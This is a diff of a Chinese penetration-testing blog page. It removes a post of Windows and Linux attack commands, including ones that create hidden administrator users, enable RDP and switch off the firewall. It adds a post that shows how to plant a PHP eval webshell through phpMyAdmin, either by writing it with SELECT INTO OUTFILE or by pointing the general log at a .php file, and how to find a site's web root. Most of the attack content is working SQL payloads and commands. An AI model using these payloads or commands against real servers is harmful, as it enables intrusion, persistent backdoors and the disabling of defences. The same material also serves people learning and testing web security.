@@ -7,18 +7,18 @@
 
 
 
-    <meta name="description" content="渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL">
+    <meta name="description" content="通过phpmyadmin获取webshell 在渗透过程中，如果通过爆破进入了phpmyadmin的后台，那么可以通过几种方法在phpmyadmin后台获取webshell，前提是得直到网站的绝对路径(信息收集的重要性)。 直接在插入一句话在phpmyadmin后台的sql栏下可以执行sql语句，首先查看into outfile是否能用执行以下语句查看:1show global variables">
 <meta property="og:type" content="article">
 <meta property="og:title" content="lsadaharu">
-<meta property="og:url" content="http://yoursite.com/2019/08/04/windows与linux命令/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/08/17/通过phpmyadmin获取webshell/index.html">
 <meta property="og:site_name" content="lsadaharu">
-<meta property="og:description" content="渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL">
+<meta property="og:description" content="通过phpmyadmin获取webshell 在渗透过程中，如果通过爆破进入了phpmyadmin的后台，那么可以通过几种方法在phpmyadmin后台获取webshell，前提是得直到网站的绝对路径(信息收集的重要性)。 直接在插入一句话在phpmyadmin后台的sql栏下可以执行sql语句，首先查看into outfile是否能用执行以下语句查看:1show global variables">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/images/og_image.png">
-<meta property="og:updated_time" content="2019-07-27T04:43:18.888Z">
+<meta property="og:updated_time" content="2019-08-16T08:21:18.030Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="lsadaharu">
-<meta name="twitter:description" content="渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL">
+<meta name="twitter:description" content="通过phpmyadmin获取webshell 在渗透过程中，如果通过爆破进入了phpmyadmin的后台，那么可以通过几种方法在phpmyadmin后台获取webshell，前提是得直到网站的绝对路径(信息收集的重要性)。 直接在插入一句话在phpmyadmin后台的sql栏下可以执行sql语句，首先查看into outfile是否能用执行以下语句查看:1show global variables">
 <meta name="twitter:image" content="http://yoursite.com/images/og_image.png">
 
 
@@ -144,13 +144,13 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-08-04T02:44:41.273Z">2019-08-04</time>
+                <time class="level-item has-text-grey" datetime="2019-08-17T03:35:01.658Z">2019-08-17</time>
                 
                 
                 <span class="level-item has-text-grey">
                     
                     
-                    7 minutes read (About 1010 words)
+                    7 minutes read (About 1093 words)
                 </span>
                 
                 
@@ -163,69 +163,53 @@
             
         </h1>
         <div class="content">
-            <h1 id="渗透windows与linux常用命令"><a href="#渗透windows与linux常用命令" class="headerlink" title="渗透windows与linux常用命令"></a>渗透windows与linux常用命令</h1><h2 id="渗透windows常用DOS命令"><a href="#渗透windows常用DOS命令" class="headerlink" title="渗透windows常用DOS命令"></a>渗透windows常用DOS命令</h2><ol>
-<li>查看本机ip信息: <code>ipconfig</code></li>
-<li>释放ip: <code>ipconfig/release</code></li>
-<li>重新获取ip: <code>ipconfig/renew</code></li>
-<li>查看系统信息: <code>systeminfo</code></li>
-<li>查看局域网计算机列表: <code>arp -a</code></li>
-<li>查看目录信息: <code>dir</code></li>
-<li>切换目录: <code>cd 目录名</code></li>
-<li>打开某个文件: <code>start 文件名</code></li>
-<li>打开某个网页: <code>start URL</code></li>
-<li>创建文件内容: <code>echo xxxx &gt; x.txt</code></li>
-<li>查看文件内容: <code>type xxx.txt</code></li>
-<li>创建目录: <code>md 目录名</code></li>
-<li>删除文件夹: <code>rd 文件夹名</code></li>
-<li>删除文件: <code>del 文件名</code></li>
-<li>复制文件: <code>copy 文件名</code></li>
-<li>移动文件或文件夹: <code>move 文件(夹)名 路径</code></li>
-<li>以树形列出文件夹结构: <code>tree 文件夹名</code></li>
-<li>查看以启动的服务: <code>net start</code></li>
-<li>开启或停止某个服务: <code>net start(stop) 服务名</code></li>
-<li>查看端口占用进程情况: <code>netstat -ano</code></li>
-<li>查看本机用户信息: <code>net user</code></li>
-<li>查看用户组信息: <code>net localgroup</code></li>
-<li>创建用户username: <code>net user username/add</code></li>
-<li>创建隐藏用户username: <code>net user username$/add</code></li>
-<li>将用户username添加到管理用户组: `net localgroup administrators username/add</li>
-<li>更改用户username密码: <code>net user username 更改的密码</code></li>
-<li>删除用户username: <code>net user username/delete</code></li>
-<li>激活(禁用)用户username: <code>net user username/active:yes(no)</code></li>
-<li>开启3389: <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code>或者<code>wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</code></li>
-<li>关闭防火墙: <code>netsh firewall set opmode mode=disable</code>或者<code>netsh advfirewall set allprofiles state off</code></li>
+            <h1 id="通过phpmyadmin获取webshell"><a href="#通过phpmyadmin获取webshell" class="headerlink" title="通过phpmyadmin获取webshell"></a>通过phpmyadmin获取webshell</h1><hr>
+<p>在渗透过程中，如果通过爆破进入了phpmyadmin的后台，那么可以通过几种方法在phpmyadmin后台获取webshell，前提是得直到网站的绝对路径(信息收集的重要性)。</p>
+<h2 id="直接在插入一句话"><a href="#直接在插入一句话" class="headerlink" title="直接在插入一句话"></a>直接在插入一句话</h2><p>在phpmyadmin后台的sql栏下可以执行sql语句，首先查看into outfile是否能用执行以下语句查看:<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like <span class="hljs-string">'%secure%'</span></span><br></pre></td></tr></table></figure></p>
+<p>如果secure_file_priv=null表示不允许导入导出；<br>如果secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹。<br>如果secure_file_priv没有设置时，表示没有任何限制，此时可以直接插入一句话在网站的根路径下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="hljs-string">'&lt;?php eval($_POST[1]);?&gt;'</span> INTO OUTFILE <span class="hljs-string">'网站的绝对路径/1.php'</span>。</span><br></pre></td></tr></table></figure></p>
+<p>此时可直接菜刀连接。</p>
+<h2 id="通过日志或webshell"><a href="#通过日志或webshell" class="headerlink" title="通过日志或webshell"></a>通过日志或webshell</h2><p>首先查看general log的日志保存状态是否为开启，一般为OFF(关闭)或者ON(打开)，general log file指的是日志的保存路径，攻击思路是将日志记录功能打开后，再更改保存日志文件的的默认路径为网站根路径下的一句话木马文件，即可获取webshell。</p>
+<ol>
+<li>在phpmyadmin后台下的sql栏执行sql语句：<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="hljs-string">'%general%'</span></span><br></pre></td></tr></table></figure>
+</li>
 </ol>
-<h1 id="渗透linux常见命令"><a href="#渗透linux常见命令" class="headerlink" title="渗透linux常见命令"></a>渗透linux常见命令</h1><ol>
-<li>显示主机信息: <code>uname -a</code></li>
-<li>查看主机名: <code>hostname</code></li>
-<li>查看ip信息: <code>ipconfig</code></li>
-<li>查看当前路径: <code>pwd</code></li>
-<li>查看当前目录文件: <code>ls</code> 查看目录文件详细信息<code>ls -l</code></li>
-<li>创建目录: <code>mkdir 目录名</code></li>
-<li>创建新文件: <code>touch 文件名</code></li>
-<li>为文件创建软连接: <code>ln -s 源文件或者目录 链接文件或者目录</code></li>
-<li>复制文件或者目录: <code>cp 源文件或目录 目标文件或目录</code></li>
-<li>删除文件或目录: <code>rm -f</code>强制删除不提醒，<code>rm -r</code>递归删除整个目录树,<code>rm -i</code>删除文件或目录提醒。</li>
-<li>移动文件: <code>mv 源文件或目录</code></li>
-<li>查找文件: <code>find -name 文件名</code></li>
-<li>查看文件内容: <code>cat</code>+文件名</li>
-<li>分页显示文件内容: <code>more</code>+文件名</li>
-<li>查看文件属性: <code>file</code>+文件名</li>
-<li>gzip压缩打包以及解压:<code>gizp -9</code>+文件，最大压缩比压缩。保留源文件压缩<code>gzip -c 文件名 &gt; 文件名.gz</code>解压<code>gzip -dv</code>+文件名.gz，保留源文件解压<code>gzip -cd 文件名.gz &gt; 压缩文件存放的目录地址</code></li>
-<li>bzip2压缩打包: <code>bzip2</code>+文件名。保留源文件压缩<code>bzip2 -k</code>+文件名.解压<code>bzip2 -dv</code>+文件名.bzip2 .保留源文件解压: <code>bzip2 -kd</code>+文件名.bzip2</li>
-<li>tar压缩解压: 以gzip格式压缩<code>tar -zcvf newfile.tar.gz 源文件</code>  gzip格式解压 <code>tar -zxvf 压缩包名 -C 解压的文件放置的目录</code> 以bzip2格式压缩 <code>tar -jcvf newfile.tar.bzip2 源文件</code> 以bzip2格式解压 <code>tar -jxvf 压缩包名 -C 解压的文件放置的目录</code> 查看压缩包中的内容<code>tar -tvf 压缩包名</code></li>
-<li>改变文件权限: <code>chmod (r-&gt;4 w-&gt;2 x-&gt;1)777 文件名</code>或者按user(所有者)-&gt;u，group(组)-&gt;u，others(其他人)-&gt;u,三套属性a.r-&gt;(可读),w-&gt;(可写),x-&gt;(可执行)赋予权限，如chmod u+r test.c-&gt;赋予test.c所有者可读权限.chmod a+w test.c-&gt;赋予test.c所有者，组，以及其他人可写权限。</li>
-<li>更改文件/目录所属的拥有者和组: <code>chown 拥有者名:组名 文件或目录名</code> 只修改所属组: <code>chogrp -R 组名 文件或目录名</code></li>
-<li>添加用户: <code>adduser 用户名</code> 修改密码 <code>passwd 用户名</code>删除用户 <code>userdel 用户名</code></li>
-<li>查看目前登陆身份: <code>whoami</code></li>
-<li>查看目前登陆的用户和组: <code>id</code></li>
-<li>显示磁盘可读的情况: <code>df -h</code></li>
-<li>显示最后登陆的用户: <code>last</code></li>
-<li>查看进程: <code>ps -aux</code> 进程的动态情况 <code>top</code></li>
-<li>终止进程: <code>kill -9 PID</code></li>
-<li>显示进程ID的网络接口: <code>netstat -tulpn</code></li>
-<li>启动ip转发: <code>echo &#39;1&#39; &gt; /proc/sys/net/ipv4/ip_forward</code></li>
+<p>此时可看到general_log的状态和general_log_file的路径。</p>
+<ol start="2">
+<li>更改general_log的状态和general_log_file的路径：<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">set</span> global general_log=<span class="hljs-string">'ON'</span>;</span><br><span class="line"><span class="hljs-built_in">set</span> global general_log_file=<span class="hljs-string">'网站根路径/1.php'</span>；</span><br></pre></td></tr></table></figure>
+</li>
 </ol>
+<p>执行完后，在网站根路径会生成1.php的伪日志文件，再用查询语句写入一句话到日志文件中<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="hljs-string">'&lt;?php eval($_POST[1]);?&gt;'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>现在可以直接菜刀连接webshell了。</p>
+<h2 id="php获取物理路的几种方法"><a href="#php获取物理路的几种方法" class="headerlink" title="php获取物理路的几种方法"></a>php获取物理路的几种方法</h2><ol>
+<li>通过sql查询<ul>
+<li>在sql查询框中输入<code>select @@basedir</code>就可以看到数据库的绝对路径，以此来猜测网站的根路径。</li>
+</ul>
+</li>
+<li>通过报错<ul>
+<li>通过在参数后面加单引号或者错误的参数来导致报错，从返回的报错信息获取物理路径。</li>
+</ul>
+</li>
+<li>Google语法<ul>
+<li>使用site语法结合关键字段搜索相关网页，有些出错的网页快照会暴露物理物理路径，常见的关键字有warning和fatal error。如果目标站点是二级域名，site接的是其对应的顶级域名，这样获取的信息多。</li>
+</ul>
+</li>
+<li><p>通过测试文件</p>
+<ul>
+<li>网站的测试文件一般都会存在根目录，比如phpinfo()等，可通过工具扫描来加快探测的速度和效率。常用的测试文件后缀名以及测试文件有<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/test.php</span><br><span class="line">www.xxx.com/ceshi.php</span><br><span class="line">www.xxx.com/info.php</span><br><span class="line">www.xxx.com/phpinfo.php</span><br><span class="line">www.xxx.com/php_info.php</span><br><span class="line">www.xxx.com/1.php</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>通过phpmyadmin获取路径</p>
+<ul>
+<li>找到phpmyadmin的管理页面后，可探测一些特定的文件来获取物理路劲。一般使用工具探测。如wwwscan等。<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/libraries/lect_lang.lib.php</span><br><span class="line">/phpMyAdmin/index.php?lang[]=1</span><br><span class="line">/phpMyAdmin/phpinfo.php</span><br><span class="line">load_file()</span><br><span class="line">/phpmyadmin/themes/darkblue_orange/layout.inc.php</span><br><span class="line">/phpmyadmin/libraries/select_lang.lib.php</span><br><span class="line">/phpmyadmin/libraries/lect_lang.lib.php</span><br><span class="line">/phpmyadmin/libraries/mcrypt.lib.php</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>通过配合文件获取路径<br>配置文件中往往需要写入物理路径，在有文件读取漏洞时，可以使用工具读取配置文件或者手工使用load_file()读取文件。以下为常见在不同系统下的配置文件</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">c:\windows\php.ini php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">/etc/php.ini php配置文件</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf Apache配置文件</span><br><span class="line">/usr/<span class="hljs-built_in">local</span>/apache/conf/httpd.conf</span><br><span class="line">/usr/<span class="hljs-built_in">local</span>/apache2/conf/httpd.conf</span><br><span class="line">/usr/<span class="hljs-built_in">local</span>/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</span><br><span class="line">/etc/nginx/conf.d/vhost.conf /usr/<span class="hljs-built_in">local</span>/etc/nginx/nginx.conf Nginx配置</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="总结：在实际写入过程中并不会有多顺利，需要根据实际情况来解决一些难题，利用漏洞组合来进行webshell的获取是一种非常好的办法，思路需要学习和总结，并通过实践去获取新的思路。"><a href="#总结：在实际写入过程中并不会有多顺利，需要根据实际情况来解决一些难题，利用漏洞组合来进行webshell的获取是一种非常好的办法，思路需要学习和总结，并通过实践去获取新的思路。" class="headerlink" title="总结：在实际写入过程中并不会有多顺利，需要根据实际情况来解决一些难题，利用漏洞组合来进行webshell的获取是一种非常好的办法，思路需要学习和总结，并通过实践去获取新的思路。"></a>总结：在实际写入过程中并不会有多顺利，需要根据实际情况来解决一些难题，利用漏洞组合来进行webshell的获取是一种非常好的办法，思路需要学习和总结，并通过实践去获取新的思路。</h2><h2 id="参考学习链接："><a href="#参考学习链接：" class="headerlink" title="参考学习链接："></a>参考学习链接：</h2><p><a href="https://zhuanlan.zhihu.com/p/55466863" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/55466863</a><br><a href="https://xz.aliyun.com/t/3283" target="_blank" rel="noopener">https://xz.aliyun.com/t/3283</a></p>
 
         </div>
         
@@ -276,7 +260,7 @@
     <div class="level post-navigation is-flex-wrap is-mobile">
         
         <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/08/04/sql注入_mysql_3/">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/08/17/Windows下抓取hash的几种方法/">
                 <i class="level-item fas fa-chevron-left"></i>
                 <span class="level-item"></span>
             </a>
@@ -284,7 +268,7 @@
         
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/2019/08/04/sql注入_mysql_4/">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/08/10/sql注入_mysql_5/">
                 <span class="level-item"></span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
